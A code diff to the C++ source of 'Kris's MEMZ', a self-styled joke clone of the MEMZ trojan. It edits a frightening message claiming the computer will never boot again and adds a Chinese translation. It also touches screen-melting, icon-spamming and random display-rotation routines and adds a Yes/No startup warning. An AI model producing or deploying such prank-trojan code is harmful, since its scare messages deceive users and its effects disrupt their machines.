@@ -1,6 +1,6 @@
 #include <windows.h>
 #include <shellapi.h>
-#include <werapi.h> 
+#include <werapi.h>
 #include <winable.h>
 #include <tchar.h>
 #include <stdlib.h>
@@ -8,7 +8,7 @@
 #include <vector>
 #include <cstdio>
 #include <pthread.h>
-#include <iostream> 
+#include <iostream>
 #include <dirent.h>
 #include <Mmsystem.h>
 #include <math.h>
@@ -17,10 +17,11 @@
 #include <string>
 #include <random>
 #include <regex>
+#include <cstdlib>
 
 #pragma once
 
-#define random_in(a,b) (rand()%(b-a)+a) 
+#define random_in(a,b) (rand()%(b-a)+a)
 #define random_list(x) (rand()%x)
 #define DESKTOP_WINDOW ((HWND)0)
 #define PI 3.1415926
@@ -40,12 +41,23 @@ LPCWSTR lpPaths[13] = {
     L"wininit.exe",
     L"werfault.exe",
     L"winver.exe",
-    L"regedit.exe" 
-    
+    L"regedit.exe"
 };
 
 HCRYPTPROV prov;
-const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D\r\n翻译:你的电脑没炸";
+const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\n\
+Your computer won't boot up again,\r\n\
+so use it as long as you can!\r\n\r\n\
+:D\r\n\r\n\
+Trying to kill MEMZ will cause your system to be\r\n\
+destroyed instantly, so don't try it :D\r\n\r\n\
+译文:\r\n\
+你的电脑已经被MEMZ姬(病毒)给干掉啦! \r\n\
+你的电脑已经无法重启咯，\r\n\
+所以尽你所能的长时间把电脑用下去吧！\r\n\r\n\
+:D\r\n\r\n\
+尝试杀死MEMZ将会导致你的系统瞬间爆炸, 所以不要尝试去作死啦~ :D\r\n";
+
 int scrw = GetSystemMetrics(SM_CXSCREEN);
 int scrh = GetSystemMetrics(SM_CYSCREEN);
 HWND hwnd;
@@ -591,7 +603,7 @@ void ScreenMelter(){
     srand((unsigned) time(&t));
     
     HDC screenDC = GetDC(NULL);
-    
+    HDC hdc = CreateCompatibleDC(screenDC);
     int scrWidth = GetDeviceCaps(screenDC, HORZRES);
     int scrHeight = GetDeviceCaps(screenDC, VERTRES);
     
@@ -667,7 +679,7 @@ void iconAura(){
             DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_INFORMATION));
             DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_WINLOGO));
             //Sleep(25);
-        }    
+        }
     }
 }
 void randomSeed(){
@@ -718,31 +730,13 @@ void infglitch(){
     }
 }
 void sayNyan(){ // Decompile By NyanConsole! (I Think This Code Need Optimize...)
-    const CHAR *v1; // ebx
-    HMODULE ModuleHandleA; // eax
-    HANDLE ImageA; // eax
     HANDLE StdHandle; // eax
     HANDLE h[12]; // [esp+5Ch] [ebp-6Ch]
-    int v15; // [esp+A0h] [ebp-28h]
+    int count; // [esp+A0h] [ebp-28h]s
     LPCSTR lpString; // [esp+A4h] [ebp-24h]
-    int i; // [esp+B4h] [ebp-14h]
-    int v21; // [esp+B8h] [ebp-10h]
-    int v22; // [esp+BCh] [ebp-Ch]
-
-    v22 = 10000;
-    v21 = 0;
-    while ( v22 <= 10011 )
-    {
-        v1 = (const CHAR *)(unsigned __int16)v22;
-        ModuleHandleA = GetModuleHandleA(0);
-        ImageA = LoadImageA(ModuleHandleA, v1, 0, 0, 0, 0x2040u);
-        h[v21] = ImageA;
-        ++v22;
-        ++v21;
-    }
     lpString = "Your computer was trashed by the MEMZ Trojan. Now enjoy the Nyan Cat...";
-    v15 = lstrlenA("Your computer was trashed by the MEMZ Trojan. Now enjoy the Nyan Cat...");
-    for ( i = 0; i < v15; ++i )
+    count = lstrlenA("Your computer was trashed by the MEMZ Trojan. Now enjoy the Nyan Cat...");
+    for (int i = 0; i < count; ++i )
     {
         StdHandle = GetStdHandle(0xFFFFFFF5);
         SetConsoleTextAttribute(StdHandle, 0x800Fu);
@@ -781,15 +775,17 @@ void OrientationsScreen()
     // 随机旋转屏幕
     for (;;)
     {
+        // 等待一会
+        Sleep(8000);
+
         // 随机选择一个旋转角度
         DWORD orientation = orientations[dis(gen)];
 
         // 设置屏幕旋转角度
         dm.dmDisplayOrientation = orientation;
         ChangeDisplaySettings(&dm, 0);
-
         // 等待一段时间
-        Sleep(500);
+
     }
 
     // 恢复默认方向
@@ -798,10 +794,13 @@ void OrientationsScreen()
 }
 
 void StartWarning(){
-    MessageBox(NULL,"This is a joke malware!\n\
+    if (MessageBoxA(NULL, "This is a joke malware!\n\
 This will not damage your computer in any way.\n\
-Click 'OK' to run the program,Click 'Cancel' to close the program(but,where is cancel)\n\
-Have fun~","Kris's MEMZ [1.37]",MB_OK|MB_ICONINFORMATION);
+Click 'OK' to run the program,Click 'Cancel' to close the program\n\
+Have fun~\n\n\
+THE CONTENT OF THIS UPDATE IS: CUTEER TEXT & WARNING", "Kris's MEMZ [1.38.9]", MB_YESNO | MB_ICONWARNING) != IDYES) {
+	ExitProcess(0);
+}
 }
 
 void CreateNote(){
